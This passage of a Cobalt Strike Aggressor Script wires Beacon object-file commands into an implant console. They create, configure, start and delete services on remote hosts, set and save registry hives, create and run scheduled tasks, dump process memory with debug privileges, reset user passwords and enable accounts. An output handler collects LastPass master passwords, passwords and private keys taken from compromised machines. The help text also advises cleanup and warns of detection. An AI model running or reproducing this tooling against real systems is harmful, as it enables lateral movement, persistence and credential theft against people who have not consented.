    if (size(@_) == 5)
    {
        $servicename = $2;
        $binpath = $3;
        $ignore = $4;
        $startmode = $5;
        $hostname = $null;
    }
    else if(size(@_) == 6)
    {
        $servicename = $2;
        $binpath = $3;
        $ignore = $4;
        $startmode = $5;
        $hostname = $6;
    }
    else
    {
        berror($1, beacon_command_detail('sc_config'));
        return;
    }
    bsc_config($1, $servicename, $binpath, $ignore, $startmode, $hostname);
}

beacon_command_register(
    "sc_config",
    "Configures an existing service",
    "
Command: sc_config 
Summary: This command configures an existing service on the target host.
Usage:   sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
         SVCNAME      Required. The name of the service to create.
         BINPATH      Required. The binary path of the service to execute.
         ERRORMODE    Required. The error mode of the service. The valid 
                      options are:
                        0 - ignore errors
                        1 - normal logging
                        2 - log severe errors
                        3 - log critical errors
         STARTMODE    Required. The start mode for the service. The valid
                      options are:
                        2 - auto start
                        3 - on demand start
                        4 - disabled
         HOSTNAME     Optional. The host to connect to and run the commnad on. The
                      local system is targeted if a HOSTNAME is not specified.
"
);

#sc_failure <SVCNAME> <RESETPERIOD> <REBOOTMESSAGE> <COMMAND> <NUMACTIONS> <ACTIONS> <OPT:HOSTNAME>
sub bsc_failure
{
    local('$hostname $servicename $resetperiod $rebootmessage $command $numactions $actions $bid $args');
    $bid = $1;
    $servicename = $2;
    $resetperiod = $3;
    $rebootmessage = $4;
    $command = $5;
    $numactions = $6;
    $actions = $7;
    $hostname = $8;
    $args = bof_pack($bid, "zzszzsz", $hostname, $servicename, $resetperiod, $rebootmessage, $command, $numactions, $actions);
    beacon_inline_execute($bid, readbof_remote($1, "sc_failure"), "go", $args);
}

#sc_failure <SVCNAME> <RESETPERIOD> <REBOOTMESSAGE> <COMMAND> <NUMACTIONS> <ACTIONS> <OPT:HOSTNAME>
alias sc_failure
{
    local('$hostname $servicename $resetperiod $rebootmessage $command $numactions $actions $junk');

    if (size(@_) == 7)
    {
        $servicename = $2;
        $resetperiod = $3;
        $rebootmessage = $4;
        $command = $5;
        $numactions = $6;
        $actions = $7;
        $hostname = $null;
    }
    else if(size(@_) == 8)
    {
        $servicename = $2;
        $resetperiod = $3;
        $rebootmessage = $4;
        $command = $5;
        $numactions = $6;
        $actions = $7;
        $hostname = $8;
    }
    else
    {
        berror($1, beacon_command_detail('sc_failure'));
        return;
    }
    bsc_failure($1, $servicename, $resetperiod, $rebootmessage, $command, $numactions, $actions, $hostname);
}

beacon_command_register(
    "sc_failure",
    "Changes the actions upon failure",
    "
Command: sc_failure 
Summary: This command configures the actions upon failure of an existing service on the target host.
Usage:   sc_failure <SVCNAME> <RESETPERIOD> <REBOOTMESSAGE> <COMMAND> <NUMACTIONS> <ACTIONS> <OPT:HOSTNAME>
         SVCNAME        Required. The name of the service to create.
         RESETPERIOD    Required. Length of period of no failures (in seconds)
                        after which to reset the failure count to 0 (may be INFINITE)
                        (Must be used in conjunction with ACTIONS )
         REBOOTMESSAGE  Message broadcast before rebooting on failure. (NULL = \"\")
         COMMAND        Command line to be run on failure. (NULL = \"\")
         NUMACTIONS     How many actions to be configured  -- e.g., 3/5000/2/800 is <2> actions
         ACTIONS        Failure actions and their delay time (in milliseconds),
                        separated by / (forward slash) -- e.g., 3/5000/2/800
                        Valid actions are:
                            0 - No action
                            1 - Restart the service
                            2 - Reboot the computer
                            3 - Run a command
                        (Must be used in conjunction with the RESETPERIOD option) (NULL = \"\")
         HOSTNAME       Optional. The host to connect to and run the commnad on. The
                        local system is targeted if a HOSTNAME is not specified.
"
);

sub bsc_create
{
    local('$hostname $servicetype $servicename $binpath $errormode $startmode $junk $desc $displayname $bid $args');
    $bid = $1;
    $servicename = $2;
    $displayname = $3;
    $binpath = $4;
    $desc = $5;
    $errormode = $6;
    $startmode = $7;
    $servicetype = $8;
    $hostname = $9;

    try {
        $junk = parseNumber($errormode, 10);
        $junk = parseNumber($startmode, 10);
    } catch $msg{
        berror($bid, beacon_command_detail('sc_create'));
        berror($bid, "either errormode or startmode is not a proper number");
        return;
    }
    if (($errormode < 0) || ($errormode > 3))
    {
        berror($bid, beacon_command_detail('sc_create'));
        berror($bid, "errormode is not a valid value");
        return;
    }
    if (($startmode < 2) || ($startmode > 4))
    {
        berror($bid, beacon_command_detail('sc_create'));
        berror($bid, "startmode is not a valid value");
        return;
    }

    $args = bof_pack($bid, "zzzzzsss",  $hostname, $servicename, $binpath, $displayname, $desc, $errormode, $startmode, $servicetype);
    beacon_inline_execute($bid, readbof_remote($bid, "sc_create"), "go", $args);
}


#sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:TYPE> <OPT:HOSTNAME>
alias sc_create
{
    local('$servicetype $hostname $servicename $binpath $ignore $startmode $junk $desc $displayname');

    if (size(@_) == 7)
    {
        $servicename = $2;
        $displayname = $3;
        $binpath = $4;
        $desc = $5;
        $ignore = $6;
        $startmode = $7;
        $servicetype = %servicetypes[3];
        $hostname = $null;
    }
    else if(size(@_) == 8)
    {
        $servicename = $2;
        $displayname = $3;
        $binpath = $4;
        $desc = $5;
        $ignore = $6;
        $startmode = $7;
        if ($8 in %servicetypes)
        {
            $servicetype = %servicetypes[$8];
        }
        else
        {
            berror($1, "invalid service type index");
            return;
        }
        $hostname = $null;
    }
    else if(size(@_) == 9)
    {
        $servicename = $2;
        $displayname = $3;
        $binpath = $4;
        $desc = $5;
        $ignore = $6;
        $startmode = $7;
        if ($8 in %servicetypes)
        {
            $servicetype = %servicetypes[$8];
        }
        else
        {
            berror($1, "invalid service type index");
            return;
        }
        $hostname = $9;
    }
    else
    {
        berror($1, beacon_command_detail('sc_create'));
        return;
    }

    bsc_create($1, $servicename, $displayname, $binpath, $desc, $ignore, $startmode, $servicetype, $hostname);
}

beacon_command_register(
    "sc_create",
    "Creates a new service",
    "
Command: sc_create 
Summary: This command creates a service on the target host.
Usage:   sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:TYPE> <OPT:HOSTNAME>
         SVCNAME      Required. The name of the service to create.
         DISPLAYNAME  Required. The display name of the service.
         BINPATH      Required. The binary path of the service to execute.
         DESCRIPTION  Required. The description of the service.
         ERRORMODE    Required. The error mode of the service. The valid 
                      options are:
                        0 - ignore errors
                        1 - nomral logging
                        2 - log severe errors
                        3 - log critical errors
         STARTMODE    Required. The start mode for the service. The valid
                      options are:
                        2 - auto start
                        3 - on demand start
                        4 - disabled
         TYPE         Optional. The type of service to create. The valid
                      options are:
                      1 - SERVICE_FILE_SYSTEM_DRIVER (File system driver service)
                      2 - SERVICE_KERNEL_DRIVER (Driver service)
                      3 - SERVICE_WIN32_OWN_PROCESS (Service that runs in its own process) <-- Default
                      4 - SERVICE_WIN32_SHARE_PROCESS (Service that shares a process with one or more other services)
         HOSTNAME     Optional. The host to connect to and run the commnad on. The
                      local system is targeted if a HOSTNAME is not specified.
"
);


#sc_delete <SVCNAME> <OPT:HOSTNAME>
alias sc_delete
{
    local('$hostname $servicename $args');


    if(size(@_) == 2)
    {
        $servicename = $2;
        $hostname = $null;
    }
    else if (size(@_) == 3)
    {
        $servicename = $2;
        $hostname = $3;
    }
    else
    {
        berror($1, beacon_command_detail("sc_delete"));
        return;
    }


    $args = bof_pack($1, "zz", $hostname, $servicename);
    beacon_inline_execute($1, readbof_remote($1, "sc_delete"), "go", $args);
}

beacon_command_register(
    "sc_delete",
    "Deletes a service",
    "
Command: sc_delete 
Summary: This command deletes the specified service on the target host.
Usage:   sc_delete <SVCNAME> <OPT:HOSTNAME>
         SVCNAME  Required. The name of the service to delete.
         HOSTNAME Optional. The host to connect to and run the commnad on. The
                  local system is targeted if a HOSTNAME is not specified.
"
);

sub bsc_stop
{
    local('$hostname $servicename $args $bid');
    $bid = $1;
    $servicename = $2;
    $hostname = $3;

    $args = bof_pack($1, "zz", $hostname, $servicename);
    beacon_inline_execute($1, readbof_remote($1, "sc_stop"), "go", $args);
}

#sc_stop <SVCNAME> <OPT:HOSTNAME>
alias sc_stop
{
    local('$hostname $servicename $args');


    if(size(@_) == 2)
    {
        $servicename = $2;
        $hostname = $null;
    }
    else if (size(@_) == 3)
    {
        $servicename = $2;
        $hostname = $3;
    }
    else
    {
        berror($1, beacon_command_detail("sc_stop"));
        return;
    }
    bsc_stop($1, $servicename, $hostname);
}

beacon_command_register(
    "sc_stop",
    "Stops a service",
    "
Command: sc_stop 
Summary: This command stops the specified service on the target host.
Usage:   sc_stop <SVCNAME> <OPT:HOSTNAME>
         SVCNAME  Required. The name of the service to stop.
         HOSTNAME Optional. The host to connect to and run the commnad on. The
                  local system is targeted if a HOSTNAME is not specified.
"
);

sub bsc_start
{
    local('$bid $hostname $servicename $args');
    $bid = $1;
    $servicename = $2;
    $hostname = $3;
    $args = bof_pack($bid, "zz", $hostname, $servicename);
    beacon_inline_execute($bid, readbof_remote($bid, "sc_start"), "go", $args);   
}


#sc_start <SVCNAME> <OPT:HOSTNAME>
alias sc_start
{
    local('$hostname $servicename $args');


    if(size(@_) == 2)
    {
        $servicename = $2;
        $hostname = $null;
    }
    else if (size(@_) == 3)
    {
        $servicename = $2;
        $hostname = $3;
    }
    else
    {
        berror($1, beacon_command_detail("sc_start"));
        return;
    }


    $args = bof_pack($1, "zz", $hostname, $servicename);
    beacon_inline_execute($1, readbof_remote($1, "sc_start"), "go", $args);
}

beacon_command_register(
    "sc_start",
    "Starts a service",
    "
Command: sc_start 
Summary: This command starts the specified service on the target host.
Usage:   sc_start <SVCNAME> <OPT:HOSTNAME>
         SVCNAME  Required. The name of the service to start.
         HOSTNAME Optional. The host to connect to and run the command on. The
                  local system is targeted if a HOSTNAME is not specified.
"
);

on beacon_output
{
    local('$beacon $message $id $output $parsed_return_file @cmd $ret $lp_files $parser $returned_len $returned_len $fp');
   
    $beacon = $1;
    $message = $2;
    if (strlen($message) > 26) {
        $message = substr($message, 17);
        $id = left($message, 10);

        if ($id eq $id_lastpass){
			@pid = unpack("I",substr($message,0xc,0x10));
			@type_int = unpack("I",substr($message, 0x10, 0x14));
			@buf_sz = unpack("I",substr($message, 0x14, 0x18));

			$type = "";
			if (@type_int[0] == 0){
				$type = "JSON";
			}else if (@type_int[0] == 1){
				$type = "PWD_MEM_OBJECT";
			}else if (@type_int[0] == 2){
				$type = "AID";
			}else if (@type_int[0] == 3){
				$type = "NAME";
			}else if (@type_int[0] == 4){
				$type = "USERNAME";
			}else if (@type_int[0] == 5){
				$type = "PASSWORD";
			}else if (@type_int[0] == 6){
				$type = "G_LOCAL_KEY";
			}else if (@type_int[0] == 7){
				$type = "LOCAL_KEY";
			}else if (@type_int[0] == 8){
				$type = "MASTER_PASSWORD";
			}else if (@type_int[0] == 9){
				$type = "USER_CONFIG";
			}else if (@type_int[0] == 10){
				$type = "PRIV_KEY";
			}

			if (@type_int[0] == 100)
			{
				$parser = script_resource("lastpass/process_lp_files.py");
				$lp_files = script_resource("lastpass");
				$parsed_return_file = script_resource("lastpass/out.txt");
				@cmd = @("python3",$parser, $lp_files);
				$ret = exec( @cmd );
				sleep(1 * 1000);
				blog($beacon, "exec ret: ". readAll($ret). "\n");
				if(-exists $parsed_return_file) {
					$returned_len = lof($parsed_return_file);
					$fp = openf($parsed_return_file);
					$output = readb($fp, $returned_len);
					closef($fp);
					deleteFile($parsed_return_file);
					blog($beacon, "LastPass return value: \n" . $output);
				}else{
					println("Exec failed");
					blog($beacon, "Exec failed");
				}	
			} else {
				$lp_filename = script_resource("lastpass/lp_".@pid[0]."_".$type.".txt");
				$handle = openf(">>".$lp_filename);
				print($handle, "<MSG>");
				print($handle, substr($message,0x18));
				println($handle, "</MSG>");
				closef($handle);
			}	

        }
    }
}


########################################
# Registry commands
########################################
#yeah I'm not dealing with this one (sub vs alias)
sub breg_set 
{
    local('$hostname $hive $path $key $type $i $value $packstr $regstr $buffer $fp');
    
    $packstr = "zizzi";
    
    if(size(@_) < 5)
    {
        berror($1, beacon_command_detail("reg_set"));
        return;
    }
    else
    {
        if($2 in %reghives)
        {
            #targeting local system
            $hostname = $null;
            $i = 1;
        }
        else{
            $hostname = "\\\\" . $2;
            $i = 2;
        }
        if (@_[$i] in %reghives)
        {
            $hive = %reghives[@_[$i]];
            $i++;
        }
        else
        {
            berror($1, beacon_command_detail("reg_set"));
            berror($1, "Provided registry hive value is invalid");
            return;
        }
        $path = @_[$i];
        $i++;
        $key = @_[$i];
        $i++;
        if( @_[$i] in %regtypes)
        {
            $regstr = @_[$i];
            $type = %regtypes[@_[$i]];
            $i++;
            if ($regstr in %inttypes)
            {
                $packstr = $packstr . "b";
                $value =  pack("I-", @_[$i]);
            }
            else if ($regstr eq "REG_MULTI_SZ")
            {
                $packstr = $packstr . "b";
                $buffer = allocate(0);
                for (; $i < size(@_); $i++)
                {
                    bwrite($buffer, "z", @_[$i]);
                }
                bwrite($buffer, "z", ""); # null terminator at end
                closef($buffer);
                $value = readb($buffer, -1);
                
            }
            else if ($regstr eq "REG_EXPAND_SZ" || $regstr eq "REG_SZ")
            {
                $packstr = $packstr . "z";
                $value = @_[$i];
            }
            else if ($regstr eq "REG_BINARY")
            {
                if (!-canread @_[$i])
                {
                    berror($1, "File " . @_[$i] . " Could not be found");
                    return;
                }
                $fp = openf(@_[$i]);
                $value = readb($fp, -1);
                $packstr = $packstr . "b";
                closef($fp);
            }
        }
        else
        {
            berror($1, beacon_command_detail("reg_set"));
            berror($1, "Provided registry type value is invalid");
            return;
        }
        $args = bof_pack($1, $packstr, $hostname, $hive, $path, $key, $type, $value);
        
        beacon_inline_execute($1, readbof_remote($1, "reg_set"), "go", $args);
    }
}

#reg_set reg_set <OPT:HOSTNAME> <HIVE> <KEY> <VALUE> <TYPE> <DATA>
alias reg_set
{
    # I need hostname Hive, path, key type value(s)
    # test if val in pos 1 is in Hive, if not, then assume it is a hostname
    # values at end, if multisz pack them using a variable bof string

    local('$hostname $hive $path $key $type $i $value $packstr $regstr $buffer $fp');
    
    $packstr = "zizzi";
    
    if(size(@_) < 5)
    {
        berror($1, beacon_command_detail("reg_set"));
        return;
    }
    else
    {
        if($2 in %reghives)
        {
            #targeting local system
            $hostname = $null;
            $i = 1;
        }
        else{
            $hostname = "\\\\" . $2;
            $i = 2;
        }
        if (@_[$i] in %reghives)
        {
            $hive = %reghives[@_[$i]];
            $i++;
        }
        else
        {
            berror($1, beacon_command_detail("reg_set"));
            berror($1, "Provided registry hive value is invalid");
            return;
        }
        $path = @_[$i];
        $i++;
        $key = @_[$i];
        $i++;
        if( @_[$i] in %regtypes)
        {
            $regstr = @_[$i];
            $type = %regtypes[@_[$i]];
            $i++;
            if ($regstr in %inttypes)
            {
                $packstr = $packstr . "b";
                $value =  pack("I-", @_[$i]);
            }
            else if ($regstr eq "REG_MULTI_SZ")
            {
                $packstr = $packstr . "b";
                $buffer = allocate(0);
                for (; $i < size(@_); $i++)
                {
                    bwrite($buffer, "z", @_[$i]);
                }
                bwrite($buffer, "z", ""); # null terminator at end
                closef($buffer);
                $value = readb($buffer, -1);
                
            }
            else if ($regstr eq "REG_EXPAND_SZ" || $regstr eq "REG_SZ")
            {
                $packstr = $packstr . "z";
                $value = @_[$i];
            }
            else if ($regstr eq "REG_BINARY")
            {
                if (!-canread @_[$i])
                {
                    berror($1, "File " . @_[$i] . " Could not be found");
                    return;
                }
                $fp = openf(@_[$i]);
                $value = readb($fp, -1);
                $packstr = $packstr . "b";
                closef($fp);
            }
        }
        else
        {
            berror($1, beacon_command_detail("reg_set"));
            berror($1, "Provided registry type value is invalid");
            return;
        }
        $args = bof_pack($1, $packstr, $hostname, $hive, $path, $key, $type, $value);
        
        beacon_inline_execute($1, readbof_remote($1, "reg_set"), "go", $args);
    }
}

beacon_command_register(
    "reg_set",
    "Creates or sets a registry key or value",
    "
Command: reg_set 
Summary: This command creates or sets the specified registry key (or value) on
         the target host.
Usage:   reg_set <OPT:HOSTNAME> <HIVE> <KEY> <VALUE> <TYPE> <DATA>
         HOSTNAME Optional. The host to connect to and run the commnad on.
         HIVE     Required. The registry hive containing the REGPATH. Possible 
                  values:
                    HKLM
                    HKCU
                    HKU
                    HKCR
         KEY      Required. The registry path. 
         VALUE    Required. The value name. If you want to create/set the 
                  default key, use \"\".                  
         TYPE     Required. The type of registry value to create/set. The valid
                  options are:
                    REG_SZ
                    REG_EXPAND_SZ
                    REG_BINARY
                    REG_DWORD
                    REG_MULTI_SZ
                    REG_QWORD
         DATA     Required. The data to store in the registry value.
Note: For REG_BINARY, the VALUE must be the name of a file on disk which will 
      read in and its contents used.
Note: For REG_MULTI_SZ, the VALUE must be specified as a space separated list 
      of quoted strings.
Note: For REG_QWORD, the VALUE must be less than a DWORD (due to limitation of
      sleep language).
"
);


#reg_delete <OPT:HOSTNAME> <HIVE> <REGPATH> <OPT:REGVALUE>
alias reg_delete
{
    # I need hostname Hive, path, key type value(s)
    # test if val in pos 1 is in Hive, if not, then assume it is a hostname
    # values at end, if multisz pack them using a variable bof string

    local('$hostname $hive $path $key $i $delkey');

    if(size(@_) < 3)
    {
        berror($1, beacon_command_detail("reg_delete"));
        return;
    }
    else
    {
        if($2 in %reghives)
        {
            #targeting local system
            $hostname = $null;
            $i = 1;
        }
        else
        {
            $hostname = "\\\\" . $2;
            $i = 2;
        }
        if (@_[$i] in %reghives)
        {
            $hive = %reghives[@_[$i]];
            $i++;
        }
        else
        {
            berror($1, beacon_command_detail("reg_delete"));
            berror($1, "Provided registry hive value is invalid");
            return;
        }
        $path = @_[$i];
        $i++;
        if($i < size(@_))
        {
            $delkey = 0;
            $key = @_[$i];
            println("set subkey value to delete to $key");
        }
        else
        {
            $delkey = 1;
            $key = "";
        }

        $args = bof_pack($1, "zizzi", $hostname, $hive, $path, $key, $delkey);
        beacon_inline_execute($1, readbof_remote($1, "reg_delete"), "go", $args);
    }
}

beacon_command_register(
    "reg_delete",
    "Deletes the registry key or value",
    "
Command: reg_delete 
Summary: This command deletes the specified registry key (or value) on the 
         target host.
Usage:   reg_delete <OPT:HOSTNAME> <HIVE> <REGPATH> <OPT:REGVALUE>
         HOSTNAME Optional. The host to connect to and run the commnad on.
         HIVE     Required. The registry hive containing the REGPATH. Possible 
                  values:
                    HKLM
                    HKCU
                    HKU
                    HKCR
         REGPATH  Required. The registry path (deleted if value not given).
         REGVALUE Optional. The registry value to delete. If the value is not 
                  specified, then the whole key is deleted. If you want to 
                  delete the default key, use \"\" as the REGVALUE.
"
);


#reg_save <HIVE> <REGPATH> <FILEOUT>
alias reg_save
{
    if(size(@_) != 4)
    {
        berror($1, beacon_command_detail("reg_save"));
        return;
    }
    else
    {
        breg_save($1, $2, $3, $4);
    }
}

sub breg_save
{
    local('$hive $regpath $output $i');

    $hive = %reghives[$2];
    $regpath = $3;
    $output = $4;

    blog($1, "Requesting to backup privileges");
    bgetprivs($1, "SeBackupPrivilege");

    blog($1, "Attempting to save registry key $2\\$regpath to location $output");
    $args = bof_pack($1, "zzi", $regpath, $output, $hive);
    beacon_inline_execute($1, readbof_remote($1, "reg_save"), "go", $args);

}

beacon_command_register(
    "reg_save",
    "Saves the registry path and all subkeys to disk",
    "
Command: reg_save 
Summary: This command saves the specified registry path (and all subkeys) to a
         file on the target system.
Usage:   reg_save <HIVE> <REGPATH> <FILEOUT>
         HIVE     Required. The registry hive containing the REGPATH. Possible 
                  values:
                    HKLM
                    HKCU
                    HKU
                    HKCR
         REGPATH  Required. The registry path to save.
         FILEOUT  Required. The output file. 
Note:    The FILEOUT is saved to disk on target, so don't forget to clean up.
"
);



########################################
# Schedule Task functions
########################################

#schtaskscreate <OPT:HOSTNAME> <TASKPATH> <USERMODE> <FORCEMODE>
alias schtaskscreate
{
    local('$server $taskpath $taskxml $dialog $fpath $fp $bid $fdata $mode $index $force $args');
    $bid = $1;
    $server = "";
    $fp = $null;

    if(size(@_) == 4)
    {
        $taskpath = $2;
        $mode = $3;
    }
    else if(size(@_) == 5)
    {
        $server = $2;
        $taskpath = $3;
        $mode = $4;
    }
    else
    {
        berror($bid, beacon_command_detail("schtaskscreate"));
        berror($bid, "Inavlid usage");
        return;
    }

    if($mode eq "USER")
    {
        $mode = 0;
    }
    else if($mode eq "SYSTEM")
    {
        $mode = 1;
    }
    else if ($mode eq "XML")
    {
        $mode = 2;
    }
    else
    {
        berror($bid, beacon_command_detail("schtaskscreate"));
        berror($bid, "Must provide USER, SYSTEM, or XML (case sensitive)");
        return;
    }

    if(@_[size(@_) -1] eq "UPDATE")
    {
        $force = 1;
    }
    else if (@_[size(@_) -1] eq "CREATE")
    {
        $force = 0;
    }
    else
    {
        berror($1, beacon_command_detail("schtaskscreate"));
        berror($1, "Must provide CREATE or UPDATE (case sensitive)");
        return;
    }

    prompt_file_open("Please select the xml task definition", $null, false, $this);
    yield;
    $fpath = $1;
    if(!-canread $fpath)
    {
        berror($bid, "Unable to read the xml task definition file: $fpath");
        return;
    }
    $fp = openf($fpath);
    $fdata = readb($fp, -1);
    closef($fp);

    $args = bof_pack($bid, "ZZZii", $server, $taskpath, $fdata, $mode, $force);
    beacon_inline_execute($bid, readbof_remote($bid, "schtaskscreate"), "go", $args);
}

beacon_command_register(
    "schtaskscreate",
    "Creates a new scheduled task",
    "
Command: schtaskscreate
Summary: This command attempts to create or update a scheduled task given an
         XML task definition.         
Usage:   schtaskscreate <OPT:HOSTNAME> <TASKPATH> <USERMODE> <FORCEMODE>
         HOSTNAME  Optional. The system on which to create the task.
         TASKPATH  Required. The path for the created task.
         USERMODE  Required. The username to associate with the task. The valid
                   options are (case sensitive):
                     USER uses the current user
                     XML uses the principal user from the task XML
                     SYSTEM uses the Local System service
         FORCEMODE Required. Creation disposition. The options are (case 
                   sensitive):
                     CREATE fail if the task already exists
                     UPDATE update an exiting task 
Note:    Please see https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-schema-elements 
         for the base xml definitions. More formed examples start here 
         https://docs.microsoft.com/en-us/windows/win32/taskschd/time-trigger-example--xml-
"
);


#schtasksdelete <OPT:HOSTNAME> <TASKNAME> <TYPE>
alias schtasksdelete
{
    local('$bid $args $server $taskname $isfolder');
    $bid = $1;
    $server = "";
    
    if ( size(@_) < 3)
    {
        berror($bid, "Invalid Usage");
        berror($bid, beacon_command_detail("schtasksdelete"));
        return;
    }
    else if(size(@_) == 3)
    {
        $taskname = $2;
    }
    else if(size(@_) == 4)
    {
        $server = $2;
        $taskname = $3;
    }
    else 
    {
        berror($bid, "Invalid Usage");
        berror($bid, beacon_command_detail("schtasksdelete"));
        return;
    }
    
    if(@_[size(@_) -1] eq "TASK")
    {
        $isfolder = 0;
    }
    else if (@_[size(@_) -1] eq "FOLDER")
    {
        $isfolder = 1;
    }
    else
    {
        berror($bid, beacon_command_detail("schtasksdelete"));
        berror($bid, "Must provide TASK or FOLDER (case sensitive)");
        return;
    }
    
    $args = bof_pack($bid, "ZZi", $server, $taskname, $isfolder);
    beacon_inline_execute($bid, readbof_remote($bid, "schtasksdelete"), "go", $args);
}

beacon_command_register(
    "schtasksdelete",
    "Deletes the specified scheduled task or folder",
    "
Command: schtasksdelete
Summary: This command deletes a scheduled task or folder.
Usage:   schtasksdelete <OPT:HOSTNAME> <TASKNAME> <TYPE>
         HOSTNAME Optional. The target system (local system if not specified)
         TASKNAME Required. The task or folder name.
         TYPE     Required. The type of target to delete. Valid options are:
                    FOLDER
                    TASK
Note:    If you are deleting a folder, it must be empty.
         If you are deleting a task, the full path including the task name must
         be given, e.g.:
             schtasksdelete \\Microsoft\\Windows\\MUI\\LpRemove TASK
             schtasksdelete \\some\\random\\task\\folder FOLDER
"
);


#schtasksstop <OPT:HOSTNAME> <TASKNAME>
alias schtasksstop
{
    local('$bid $args $server $taskname');
    $bid = $1;
    $server = "";
    if ( size(@_) < 2)
    {
        berror($bid, "Invalid Usage");
        berror($bid, beacon_command_detail("schtasksstop"));
        return;
    } else if(size(@_) == 2)
    {
        $taskname = $2;
    } else if(size(@_) == 3)
    {
        $server = $2;
        $taskname = $3;
    } else 
    {
        berror($bid, "Invalid Usage");
        berror($bid, beacon_command_detail("schtasksstop"));
        return;
    }
    $args = bof_pack($bid, "ZZ", $server, $taskname);
    beacon_inline_execute($bid, readbof_remote($bid, "schtasksstop"), "go", $args);
}

beacon_command_register(
    "schtasksstop",
    "Stops the specified scheduled task",
    "
Command: schtasksstop
Summary: This command stops a scheduled task.
Usage:   schtasksstop <OPT:HOSTNAME> <TASKNAME>
         HOSTNAME  Optional. The target system (local system if not specified)
         TASKNAME  Required. The scheduled task name.
Note:    The full path including the task name must be given, e.g.:
             schtasksstop \\Microsoft\\Windows\\MUI\\LpRemove
             schtasksstop \\Microsoft\\windows\\MUI\\totallyreal
"
);

#schtasksrun <OPT:HOSTNAME> <TASKNAME>
alias schtasksrun
{
    local('$bid $args $server $taskname');
    $bid = $1;
    $server = "";
    if ( size(@_) < 2)
    {
        berror($bid, "Invalid Usage");
        berror($bid, beacon_command_detail("schtasksrun"));
        return;
    } else if(size(@_) == 2)
    {
        $taskname = $2;
    } else if(size(@_) == 3)
    {
        $server = $2;
        $taskname = $3;
    } else
    {
        berror($bid, "Invalid Usage");
        berror($bid, beacon_command_detail("schtasksrun"));
        return;
    }
    $args = bof_pack($bid, "ZZ", $server, $taskname);
    beacon_inline_execute($bid, readbof_remote($bid, "schtasksrun"), "go", $args);
}

beacon_command_register(
    "schtasksrun",
    "Run the specified scheduled task",
    "
Command: schtasksrun
Summary: This command runs a scheduled task.
Usage:   schtasksstop <OPT:HOSTNAME> <TASKNAME>
         HOSTNAME  Optional. The target system (local system if not specified)
         TASKNAME  Required. The scheduled task name.
Note:    The full path including the task name must be given, e.g.:
             schtasksstop \\Microsoft\\Windows\\MUI\\LpRemove
             schtasksstop \\Microsoft\\windows\\MUI\\totallyreal
"
);



########################################
# Process functions
########################################

#procdump <PID> <FILEOUT>
alias procdump
{
    local('$args $pid $target');
    
    if (size(@_) != 3)
    {
        berror($1, beacon_command_detail("procdump"));
        berror($1, "Invalid number of arguments");
        return;
    }
    
    blog($1, "Requesting to enable debug privs");
    bgetprivs($1, "SeDebugPrivilege");

    blog($1, "Attempting to dump pid $2 to location $3");
    $args = bof_pack($1, "iZ", $2, $3);
    beacon_inline_execute($1, readbof_remote($1, "procdump"), "go", $args);
}

beacon_command_register(
    "procdump",
    "Dumps the specified process to the specified output file",
    "
Command: procdump
Summary: This command attempts to dump a process using MiniDumpWriteDump. It 
         writes the output to the file location specified.
Usage:   procdump <PID> <FILEOUT>
         PID     Required. The process to dump.
         FILEOUT Required. The output path to write the dump to. Remember to 
                 delete this file.
Warning: This command may very well get caught, but is here as an option regardless.
"
);


#ProcessListHandles <PID>
alias ProcessListHandles
{
    if(size(@_) != 2)
    {
        berror($1, "Invalid number of arguments");
        berror($1, beacon_command_detail("ProcessListHandles"));
        return;
    }
    beacon_inline_execute($1, readbof_remote($1, "ProcessListHandles"), "go", bof_pack($1, "i", $2));
}

beacon_command_register(
    "ProcessListHandles",
    "Lists open handles in process",
    "
Command: ProcessListHandles
Summary: Lists all open handles in a specified process.
Usage:   ProcessListHandles <PID>
         PID    Required. The process to list the handles of. You must have 
                permission to open the specified process.
"
);


#ProcessDestroy <PID> <OPT:HANDLEID>
alias ProcessDestroy
{
    local('$handle');
    if(size(@_) < 2)
    {
        berror($1, "Invalid number of arguments");
        berror($1, beacon_command_detail("ProcessDestroy"));
        return;
    }
    $handle = iff(-istrue $3, $3, 0);
    if($handle < 0 || $handle > 65535)
    {
        berror($1, "Invalid HANDLEID");
        berror($1, beacon_command_detail("ProcessDestroy"));
        return;
    }
    beacon_inline_execute($1, readbof_remote($1, "ProcessDestroy"), "go", bof_pack($1, "ii", $2, $handle));
}

beacon_command_register(
    "ProcessDestroy",
    "Closes handle(s) in a process",
    "
Command: ProcessDestroy
Summary: Closes specified handle in a specified process, or closes all handles 
         if one is not specified.
Usage:   ProcessDestroy <PID> <OPT:HANDLEID>
         PID       Required. The process to list the handles of. You must have 
                   permission to open the specified process.
         HANDLEID: Optional. The specific handle ID to close, or close all 
                   handles if not specified. The values for HANDLEID must be 
                   between 1 - 65535.
"
);



########################################
# User account functions
########################################

#enableuser <USERNAME> <DOMAIN>
alias enableuser
{
    if(size(@_) != 3)
    {
        berror($1, beacon_command_detail("enableuser"));
        berror($1, "Invalid number of parameters");
        return;
    }
    beacon_inline_execute($1, readbof_remote($1, "enableuser"), "go", bof_pack($1, "ZZ", $3, $2));
}

beacon_command_register(
    "enableuser",
    "Enables and unlocks the specified user account",
    "
Command: enableuser
Summary: Activates (and if necessary enables) the specified user account on the
         target computer. 
Usage:   enableuser <USERNAME> <DOMAIN>
         USERNAME  Required. The user name to activate/enable. 
         DOMAIN    Required. The domain/computer for the account. You must give 
                   the domain name for the user if it is a domain account, or
                   use \"\" to target an account on the local machine.
"
);


#setuserpass <USERNAME> <PASSWORD> <DOMAIN>
alias setuserpass
{
    if(size(@_) != 4)
    {
        berror($1, beacon_command_detail("setuserpass"));
        berror($1, "Invalid number of parameters");
        return;
    }
    beacon_inline_execute($1, readbof_remote($1, "setuserpass"), "go", bof_pack($1, "ZZZ", $4, $2, $3));
}

beacon_command_register(
    "setuserpass",
    "Sets the specified user\'s password",
    "
Command: setuserpass
Summary: Sets the password for the specified user account on the target 
         computer. 
Usage:   setuserpass <USERNAME> <PASSWORD> <DOMAIN>
         USERNAME  Required. The user name to activate/enable. 
         PASSWORD  Required. The new password. The password must meet GPO 
                   requirements.
         DOMAIN    Required. The domain/computer for the account. You must give 
                   the domain name for the user if it is a domain account, or
                   use \"\" to target an account on the local machine.
"
);
    

#addusertogroup
alias addusertogroup
{
